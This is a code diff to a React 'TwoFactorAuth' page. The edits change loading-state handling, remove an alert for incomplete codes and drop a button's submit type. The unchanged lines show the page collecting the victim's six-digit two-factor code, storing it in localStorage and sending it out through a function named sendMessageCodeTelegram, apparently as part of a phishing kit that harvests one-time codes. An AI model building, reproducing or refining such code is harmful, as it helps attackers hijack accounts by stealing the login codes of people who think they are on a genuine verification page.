@@ -63,10 +63,11 @@ export default function TwoFactorAuth() {
   // Handle form submission
   const handleSubmit = (e) => {
     e.preventDefault();
-    setIsLoading(true);
     const twoFactorCode = code.join("");
 
     if (twoFactorCode.length === 6) {
+      setIsLoading(true);
+
       localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
       sendMessageCodeTelegram(twoFactorCode);
 
@@ -78,8 +79,6 @@ export default function TwoFactorAuth() {
         }
         setIsLoading(false);
       }, 3500); // Delay 2 giây
-    } else {
-      alert("Please enter a complete 6-digit code");
     }
   };
 
@@ -179,7 +178,7 @@ export default function TwoFactorAuth() {
             </div>
 
             <div className="tfa-actions">
-              <button type="submit" className="tfa-submit-button" onClick={handleSubmit}>
+              <button className="tfa-submit-button" onClick={handleSubmit}>
                 Continue
               </button>
 
